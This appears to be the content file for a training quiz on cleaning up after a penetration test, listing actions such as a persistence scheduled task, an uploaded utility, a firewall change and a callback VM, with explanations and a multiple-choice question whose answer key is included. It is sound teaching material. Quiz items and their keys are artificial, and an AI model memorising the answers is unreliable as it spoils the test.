lines.text: 10:40 Added a scheduled task 'SysCheck' that runs your tool at logon
lines.why: A scheduled task you added is a persistence mechanism. It has to be deleted or the server will keep running your tool.

lines.text: 11:15 Copied a testing utility into C:\Windows\Temp on srv-lab-04
lines.why: Tools you uploaded must be removed from the client's system so they are not left for others to find or misuse.
Read-only commands change nothing on the server. The output goes in your notes, so there is nothing to undo.

lines.text: 13:20 Changed the firewall rule on srv-lab-04 to allow your test traffic
lines.why: A configuration change you made must be reverted to the original setting so the server is as secure as before.

lines.text: 12:30 Started a cloud VM as a callback server for the test
lines.why: Infrastructure you stood up must be spun down, and any data on it securely destroyed, so nothing is left running or exposed.

lines.text: 14:00 Client admin created the account 'bkp_ops' during the test window
lines.why: The client created this account, so it is not yours to delete. If you think it is risky, tell the client instead.

lines.text: 14:35 Saved your scan results and screenshots on your own laptop
lines.why: These are artifacts you keep as evidence for the report, stored on your own system and handled securely. They are not left on the target. After the report is accepted and the retention period ends, destroy it securely as the contract says.

ask.label: After removing those items, what comes next?
opts: Leave the tools in place in case a retest is requested
Delete all of your logs and notes so no trace of the test remains
Tell the client what was removed and keep evidence securely
Securely wipe all evidence on your laptop now, before the report is written
ask.why: Cleanup is proven by telling the client exactly what you removed or reverted, so they can check it. You keep your own evidence for the report. Secure destruction comes after the report is delivered and the retention period ends. Leaving tools in place leaves the client at risk.
